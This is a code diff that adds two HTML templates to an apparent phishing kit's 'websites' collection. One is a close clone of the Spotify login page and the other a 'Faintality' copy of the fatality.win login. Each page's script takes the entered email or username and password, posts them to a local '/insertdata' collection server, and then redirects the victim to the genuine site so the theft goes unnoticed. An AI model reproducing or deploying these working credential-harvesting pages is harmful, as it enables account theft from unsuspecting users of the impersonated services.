@@ -141,6 +141,974 @@ export const websites = {
       </script>
   </body>
   </html>`,
+  "Spotify":`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify Test Web | dont login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #121212 0%, #1a1a1a 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(18, 18, 18, 0.95);
+            border-radius: 12px;
+            padding: 48px;
+            width: 100%;
+            max-width: 450px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .logo-icon svg {
+            width: 48px;
+            height: 48px;
+            fill: #1db954;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 32px;
+            letter-spacing: -0.5px;
+        }
+
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            padding: 16px 24px;
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 500px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+
+        .social-btn:hover {
+            border-color: #ffffff;
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .social-btn .icon {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .social-btn .icon svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .phone {
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 32px 0;
+            gap: 16px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .divider span {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .input-container {
+            position: relative;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #1db954;
+            box-shadow: 0 0 0 2px rgba(29, 185, 84, 0.2);
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.6);
+            cursor: pointer;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+
+        .password-toggle:hover {
+            color: #ffffff;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: #1db954;
+            color: #000000;
+            border: none;
+            border-radius: 500px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 32px 0 24px 0;
+            text-transform: none;
+        }
+
+        .login-btn:hover {
+            background: #1ed760;
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(29, 185, 84, 0.3);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .forgot-password a {
+            color: #ffffff;
+            text-decoration: underline;
+            font-size: 16px;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password a:hover {
+            color: #1db954;
+        }
+
+        .signup-link {
+            text-align: center;
+            padding-top: 32px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .signup-link span {
+            color: rgba(255, 255, 255, 0.7);
+            margin-right: 8px;
+        }
+
+        .signup-link a {
+            color: #ffffff;
+            text-decoration: underline;
+            font-weight: 600;
+            transition: color 0.3s ease;
+        }
+
+        .signup-link a:hover {
+            color: #1db954;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 24px;
+            }
+            
+            .title {
+                font-size: 28px;
+            }
+        }
+
+        /* Add subtle animation */
+        .container {
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-icon">
+                <svg role="img" viewBox="0 0 24 24" aria-label="Spotify" aria-hidden="false" height="100%" data-encore-id="logoSpotify" style="fill: #1db954;">
+                    <title>Spotify</title>
+                    <path d="M13.427.01C6.805-.253 1.224 4.902.961 11.524.698 18.147 5.853 23.728 12.476 23.99c6.622.263 12.203-4.892 12.466-11.514S20.049.272 13.427.01m5.066 17.579a.717.717 0 0 1-.977.268 14.4 14.4 0 0 0-5.138-1.747 14.4 14.4 0 0 0-5.42.263.717.717 0 0 1-.338-1.392c1.95-.474 3.955-.571 5.958-.29 2.003.282 3.903.928 5.647 1.92a.717.717 0 0 1 .268.978m1.577-3.15a.93.93 0 0 1-1.262.376 17.7 17.7 0 0 0-5.972-1.96 17.7 17.7 0 0 0-6.281.238.93.93 0 0 1-1.11-.71.93.93 0 0 1 .71-1.11 19.5 19.5 0 0 1 6.94-.262 19.5 19.5 0 0 1 6.599 2.165c.452.245.62.81.376 1.263m1.748-3.551a1.147 1.147 0 0 1-1.546.488 21.4 21.4 0 0 0-6.918-2.208 21.4 21.4 0 0 0-7.259.215 1.146 1.146 0 0 1-.456-2.246 23.7 23.7 0 0 1 8.034-.24 23.7 23.7 0 0 1 7.657 2.445c.561.292.78.984.488 1.546m13.612-.036-.832-.247c-1.67-.495-2.14-.681-2.14-1.353 0-.637.708-1.327 2.264-1.327 1.539 0 2.839.752 3.51 1.31.116.096.24.052.24-.098V6.935c0-.097-.027-.15-.098-.203-.83-.62-2.272-1.07-3.723-1.07-2.953 0-4.722 1.68-4.722 3.59 0 2.157 1.371 2.91 3.626 3.546l.973.274c1.689.478 1.998.902 1.998 1.556 0 1.097-.831 1.433-2.07 1.433-1.556 0-3.457-.911-4.35-2.025-.08-.098-.177-.053-.177.062v2.423c0 .097.01.141.08.22.743.814 2.52 1.53 4.59 1.53 2.546 0 4.456-1.485 4.456-3.784 0-1.787-1.052-2.865-3.625-3.635m10.107-1.76c-1.68 0-2.653 1.026-3.219 2.052V9.376c0-.08-.044-.124-.124-.124h-2.22c-.079 0-.123.044-.123.124V20.72c0 .08.044.124.124.124h2.22c.079 0 .123-.044.123-.124v-4.536c.566 1.025 1.521 2.034 3.237 2.034 2.264 0 3.89-1.955 3.89-4.581s-1.644-4.545-3.908-4.545m-.654 6.986c-1.185 0-2.211-1.167-2.618-2.458.407-1.362 1.344-2.405 2.618-2.405 1.211 0 2.051.92 2.051 2.423s-.84 2.44-2.051 2.44m40.633-6.826h-2.264c-.08 0-.115.017-.15.097l-2.282 5.483-2.29-5.483c-.035-.08-.07-.097-.15-.097h-3.661v-.584c0-.955.645-1.397 1.476-1.397.496 0 1.035.256 1.415.486.089.053.15-.008.115-.088l-.796-1.901a.26.26 0 0 0-.124-.133c-.389-.203-1.025-.38-1.644-.38-1.875 0-2.954 1.432-2.954 3.254v.743h-1.503c-.08 0-.124.044-.124.124v1.768c0 .08.044.124.124.124h1.503v6.668c0 .08.044.123.124.123h2.264c.08 0 .124-.044.124-.123v-6.668h1.936l2.812 6.11-1.512 3.325c-.044.098.009.142.097.142h2.414c.08 0 .116-.018.15-.097l4.997-11.355c.035-.08-.009-.141-.097-.141M54.964 9.04c-2.865 0-4.837 2.025-4.837 4.616 0 2.573 1.971 4.616 4.837 4.616 2.856 0 4.846-2.043 4.846-4.616 0-2.591-1.99-4.616-4.846-4.616m.008 7.065c-1.37 0-2.343-1.043-2.343-2.45 0-1.405.973-2.449 2.343-2.449 1.362 0 2.335 1.043 2.335 2.45 0 1.406-.973 2.45-2.335 2.45m33.541-6.334a1.24 1.24 0 0 0-.483-.471 1.4 1.4 0 0 0-.693-.17q-.384 0-.693.17a1.24 1.24 0 0 0-.484.471q-.174.302-.174.681 0 .375.174.677.175.3.484.471t.693.17.693-.17.483-.471.175-.676q0-.38-.175-.682m-.211 1.247a1 1 0 0 1-.394.39 1.15 1.15 0 0 1-.571.14 1.16 1.16 0 0 1-.576-.14 1 1 0 0 1-.391-.39 1.14 1.14 0 0 1-.14-.566q0-.316.14-.562t.391-.388.576-.14q.32 0 .57.14.253.141.395.39t.142.565q0 .312-.142.56m-19.835-5.78c-.85 0-1.468.6-1.468 1.396s.619 1.397 1.468 1.397c.866 0 1.485-.6 1.485-1.397 0-.796-.619-1.397-1.485-1.397m19.329 5.19a.31.31 0 0 0 .134-.262q0-.168-.132-.266-.132-.099-.381-.099h-.588v1.229h.284v-.489h.154l.374.489h.35l-.41-.518a.5.5 0 0 0 .215-.084m-.424-.109h-.26v-.3h.27q.12 0 .184.036a.12.12 0 0 1 .065.116.12.12 0 0 1-.067.111.4.4 0 0 1-.192.037M69.607 9.252h-2.263c-.08 0-.124.044-.124.124v8.56c0 .08.044.123.124.123h2.263c.08 0 .124-.044.124-.123v-8.56c0-.08-.044-.124-.124-.124m-3.333 6.605a2.1 2.1 0 0 1-1.053.257c-.725 0-1.185-.425-1.185-1.362v-3.484h2.211c.08 0 .124-.044.124-.124V9.376c0-.08-.044-.124-.124-.124h-2.21V6.944c0-.097-.063-.15-.15-.08l-3.954 3.113c-.053.044-.07.088-.07.16v1.007c0 .08.044.124.123.124h1.539v3.855c0 2.087 1.203 3.06 2.918 3.06.743 0 1.46-.194 1.884-.442.062-.035.07-.07.07-.133v-1.68c0-.088-.044-.115-.123-.07" transform="translate(-0.95,0)"></path>
+                </svg>
+            </div>
+            <h1 class="title">Log in to Spotify</h1>
+        </div>
+
+        <div class="social-buttons">
+            <button class="social-btn google">
+                <span class="icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 48 48">
+                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
+                    </svg>
+                </span>
+                Continue with Google
+            </button>
+            
+            <button class="social-btn facebook">
+                <span class="icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 24 24">
+                        <path fill="#1877f2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path>
+                    </svg>
+                </span>
+                Continue with Facebook
+            </button>
+            
+            <button class="social-btn apple">
+                <span class="icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 24 24">
+                        <path fill="#ffffff" d="M 16.125 1 C 14.972 1.067 13.648328 1.7093438 12.861328 2.5273438 C 12.150328 3.2713438 11.589359 4.3763125 11.818359 5.4453125 C 13.071359 5.4783125 14.329031 4.8193281 15.082031 3.9863281 C 15.785031 3.2073281 16.318 2.12 16.125 1 z M 16.193359 5.4433594 C 14.384359 5.4433594 13.628 6.5546875 12.375 6.5546875 C 11.086 6.5546875 9.9076562 5.5136719 8.3476562 5.5136719 C 6.2256562 5.5146719 3 7.4803281 3 12.111328 C 3 16.324328 6.8176563 21 8.9726562 21 C 10.281656 21.013 10.599 20.176969 12.375 20.167969 C 14.153 20.154969 14.536656 21.011 15.847656 21 C 17.323656 20.989 18.476359 19.367031 19.318359 18.082031 C 19.922359 17.162031 20.170672 16.692344 20.638672 15.652344 C 17.165672 14.772344 16.474672 9.1716719 20.638672 8.0136719 C 19.852672 6.6726719 17.558359 5.4433594 16.193359 5.4433594 z"></path>
+                    </svg>
+                </span>
+                Continue with Apple
+            </button>
+            
+            <button class="social-btn phone">
+                Continue with phone number
+            </button>
+        </div>
+
+        <div class="divider">
+            <span>or</span>
+        </div>
+
+        <form>
+            <div class="form-group">
+                <label for="email">Email or username</label>
+                <input 
+                    type="text" 
+                    id="email" 
+                    name="email" 
+                    placeholder="Email or username"
+                    required
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="input-container">
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        placeholder="Password"
+                        required
+                    >
+                    <button type="button" class="password-toggle" onclick="togglePassword()">
+                        👁️
+                    </button>
+                </div>
+            </div>
+
+            <button type="submit" id="testeb" class="login-btn">Log In</button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="https://accounts.spotify.com/en-GB/login">Log in without password</a>
+        </div>
+
+        <div class="signup-link">
+            <span>Don't have an account?</span>
+            <a href="https://accounts.spotify.com/en-GB/login">Sign up for Spotify</a>
+        </div>
+    </div>
+
+    <script>
+        const uid = "user123user123"; 
+        const websiteName = "mywebsitemywebsite"; 
+    
+        async function handleSubmit(event) {
+          event.preventDefault(); 
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+          const signInButton = document.getElementById("testeb");
+              signInButton.disabled = true;
+              signInButton.style.opacity = '0.5';
+              signInButton.style.cursor = 'not-allowed';
+          try {
+            const response = await fetch("http://localhost:5237/insertdata", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                uid: uid,
+                websiteName: websiteName,
+                email: email,
+                password: password
+              })
+            });
+    
+            window.location.href = "https://accounts.spotify.com/en-GB/login";
+          } catch (error) {
+            window.location.href = "https://accounts.spotify.com/en-GB/login";
+            console.error("Error inserting data:", error);
+          }
+        }
+
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const toggleBtn = document.querySelector('.password-toggle');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleBtn.textContent = '🙈';
+            } else {
+                passwordField.type = 'password';
+                toggleBtn.textContent = '👁️';
+            }
+        }
+
+        // Handle form submission
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleSubmit(e);
+        });
+
+        // Handle social button clicks
+        document.querySelectorAll('.social-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                const service = this.textContent.trim().split(' ').pop();
+                window.location.href = 'https://accounts.spotify.com/en-GB/login';
+            });
+        });
+
+        // Add subtle hover effects to inputs
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'translateY(-1px)';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'translateY(0)';
+            });
+        });
+    </script>
+</body>
+</html>`,
+  "Fatality":`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Faintality</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .header {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            gap: 20px;
+            z-index: 10;
+        }
+
+        .header a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 14px;
+            opacity: 0.8;
+            transition: opacity 0.3s;
+        }
+
+        .header a:hover {
+            opacity: 1;
+        }
+
+        .header .register {
+            opacity: 0.5;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 72px;
+            font-weight: bold;
+            letter-spacing: 8px;
+            color: #ffffff;
+            margin-bottom: 100px;
+            position: relative;
+            animation: ft-glitch .65s cubic-bezier(.25, .46, .45, .94) infinite both;
+        }
+
+        .logo::before,
+        .logo::after {
+            content: 'FAINTALITY';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .logo::before {
+            animation: glitch-1 2s infinite;
+            color: #ff0040;
+            z-index: -1;
+        }
+
+        .logo::after {
+            animation: glitch-2 2s infinite;
+            color: #00ffff;
+            z-index: -2;
+        }
+
+        @keyframes ft-glitch {
+            0% {
+                text-shadow:none
+            }
+            25% {
+                text-shadow:-2px -2px 0 #eb055a, 2px 2px 0 #4632f0
+            }
+            50% {
+                text-shadow:2px -2px 0 #eb055a, -2px 2px 0 #4632f0
+            }
+            75% {
+                text-shadow:-2px 2px 0 #eb055a, 2px -2px 0 #4632f0
+            }
+            100% {
+                text-shadow:2px 2px 0 #eb055a, -2px -2px 0 #4632f0
+            }
+        }
+
+        @keyframes glitch-1 {
+            0%, 74%, 76%, 100% {
+                transform: translate(0);
+                opacity: 0.8;
+            }
+            75% {
+                transform: translate(2px, -2px);
+                opacity: 0.8;
+            }
+        }
+
+        @keyframes glitch-2 {
+            0%, 74%, 76%, 100% {
+                transform: translate(0);
+                opacity: 0.8;
+            }
+            75% {
+                transform: translate(-2px, -2px);
+                opacity: 0.8;
+            }
+        }
+
+        .login-section {
+            background: rgba(40, 40, 40, 0.8);
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 40px;
+            width: 400px;
+            backdrop-filter: blur(10px);
+        }
+
+        .login-title {
+            font-size: 24px;
+            margin-bottom: 30px;
+            color: #ffffff;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #cccccc;
+            font-size: 14px;
+        }
+
+        .input-container {
+            position: relative;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 40px 12px 12px;
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #c44569;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .forgot-password {
+            color: #c44569;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-top: 8px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+        }
+
+        .checkbox-container label {
+            font-size: 14px;
+            color: #cccccc;
+            margin: 0;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background: #c44569;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-bottom: 20px;
+        }
+
+        .login-button:hover {
+            background: #a53658;
+        }
+
+        .register-link {
+            text-align: center;
+            font-size: 14px;
+            color: #cccccc;
+        }
+
+        .register-link a {
+            color: #ffffff;
+            text-decoration: none;
+            margin-left: 8px;
+        }
+
+        .register-link a:hover {
+            text-decoration: underline;
+        }
+
+        .cookie-notice {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #cccccc;
+            border-top: 1px solid #333;
+        }
+
+        .cookie-notice p {
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .cookie-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .cookie-buttons button {
+            background: none;
+            border: none;
+            color: #ffffff;
+            cursor: pointer;
+            font-size: 13px;
+            text-decoration: underline;
+        }
+
+        .cookie-buttons .accept {
+            color: #4CAF50;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal.active {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 30px;
+            width: 450px;
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            color: #c44569;
+        }
+
+        .close-button {
+            background: none;
+            border: none;
+            color: #c44569;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .close-button:hover {
+            color: #ff6b9d;
+        }
+    </style>
+</head>
+<body>
+    <script>
+  
+        const uid = "user123user123"; 
+        const websiteName = "mywebsitemywebsite"; 
+    
+        async function handleSubmit(event) {
+          event.preventDefault(); 
+          const email = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
+          const signInButton = document.getElementById("testeb");
+              signInButton.disabled = true;
+              signInButton.style.opacity = '0.5';
+              signInButton.style.cursor = 'not-allowed';
+          try {
+            const response = await fetch("http://localhost:5237/insertdata", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                uid: uid,
+                websiteName: websiteName,
+                email: email,
+                password: password
+              })
+            });
+    
+            window.location.href = "https://fatality.win";
+          } catch (error) {
+            window.location.href = "https://fatality.win";
+            console.error("Error inserting data:", error);
+          }
+        }
+      </script>
+
+    <div class="header">
+        <a href="https://fatality.win" onclick="showModal()">Log in</a>
+        <a href="https://fatality.win" class="register">Register</a>
+    </div>
+
+    <div class="main-container">
+        <h1 class="logo">FAINTALITY</h1>
+        
+        <div class="login-section">
+            <h2 class="login-title">Log in</h2>
+            
+            <div class="form-group">
+                <label for="username">Your name or email address:</label>
+                <div class="input-container">
+                    <input type="text" id="username" name="username">
+                    <span class="input-icon">👤</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <div class="input-container">
+                    <input type="password" id="password" name="password">
+                    <span class="input-icon" onclick="togglePassword()" style="color: #c44569;">👁</span>
+                </div>
+                <a href="https://fatality.win" class="forgot-password">Forgot your password?</a>
+            </div>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember">Stay logged in</label>
+            </div>
+
+            <button class="login-button" id="testeb" onclick="handleSubmit">🔒 Log in</button>
+
+            <div class="register-link">
+                Don't have an account?
+                <a href="https://fatality.win">Register now</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="cookie-notice">
+        <p>This site uses cookies to help personalise content, tailor your experience and to keep you logged in if you register.<br>
+        By continuing to use this site, you are consenting to our use of cookies.</p>
+        <div class="cookie-buttons">
+            <button class="accept" onclick="hideCookieNotice()">✓ Accept</button>
+            <button onclick="showCookieInfo()">Learn more..</button>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Log in</h2>
+                <button class="close-button" onclick="hideModal()">✕</button>
+            </div>
+            
+            <div class="form-group">
+                <label for="modal-username">Your name or email address:</label>
+                <div class="input-container">
+                    <input type="text" id="modal-username" name="username">
+                    <span class="input-icon">🔑</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="modal-password">Password:</label>
+                <div class="input-container">
+                    <input type="password" id="modal-password" name="password">
+                    <span class="input-icon" onclick="toggleModalPassword()" style="color: #c44569;">👁 Show</span>
+                </div>
+                <a href="https://fatality.win" class="forgot-password">Forgot your password?</a>
+            </div>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="modal-remember" name="remember" checked>
+                <label for="modal-remember">Stay logged in</label>
+            </div>
+
+            <button class="login-button">🔒 Log in</button>
+
+            <div class="register-link">
+                Don't have an account?
+                <a href="https://fatality.win">Register now</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showModal() {
+            document.getElementById('loginModal').classList.add('active');
+        }
+
+        function hideModal() {
+            document.getElementById('loginModal').classList.remove('active');
+        }
+
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const icon = event.target;
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                icon.textContent = '🙈';
+            } else {
+                passwordField.type = 'password';
+                icon.textContent = '👁';
+            }
+        }
+
+        function toggleModalPassword() {
+            const passwordField = document.getElementById('modal-password');
+            const icon = event.target;
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                icon.textContent = '🙈 Hide';
+            } else {
+                passwordField.type = 'password';
+                icon.textContent = '👁 Show';
+            }
+        }
+
+        function hideCookieNotice() {
+            document.querySelector('.cookie-notice').style.display = 'none';
+        }
+
+        function showCookieInfo() {
+            alert('Cookie information would be displayed here.');
+        }
+
+        // Close modal when clicking outside
+        document.getElementById('loginModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                hideModal();
+            }
+        });
+
+        // Handle form submissions
+        document.querySelectorAll('.login-button').forEach(button => {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                handleSubmit(e);
+            });
+        });
+    </script>
+</body>
+</html>`,
     "Free Pi Coins":`<!DOCTYPE html>
   <html lang="en">
   <head>
